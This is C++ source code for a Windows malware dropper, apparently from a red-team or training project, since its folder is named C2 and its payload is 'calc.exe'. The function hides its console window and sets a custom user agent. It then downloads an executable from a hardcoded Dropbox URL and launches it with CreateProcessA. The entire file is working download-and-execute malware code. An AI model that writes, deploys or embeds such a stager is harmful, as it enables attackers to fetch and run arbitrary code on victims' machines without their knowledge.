#include "Dropper.h"

//dropToPath takes three parameters, url is the link to the file to download,
//filePath is the filePath we want to drop(include the filename), example: C:\\Users\\53444\\Downloads\\C2\\calc.exe
//if execute is true, is going to run the downloaded file after download finishes
//note that some location might require admin previlige to access
void dropToPath(std::string url, std::string filePath, bool execute) {
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	FreeConsole();
	memset(&si, 0, 0x68);
	si.cb = 0x68;
	UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, (LPVOID)"ch0nky", 7, 0);
	HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), filePath.c_str(), 0, NULL);
	if(execute) {
		if (CreateProcessA((LPSTR)0x0, (LPSTR)filePath.c_str(), (LPSECURITY_ATTRIBUTES)0x0,
			(LPSECURITY_ATTRIBUTES)0x0, 0, 0, (LPVOID)0x0, (LPSTR)0x0, (LPSTARTUPINFOA)&si,
			&pi) == 0) {
			CloseHandle(pi.hProcess);
		}
	}
}

int main(int argc, char* argv[]) {
	dropToPath("https://www.dropbox.com/s/2rx3deidm6h16tx/calc.exe?dl=1", "C:\\Users\\53444\\Downloads\\C2\\calc.exe", 1);
	return 0;
}
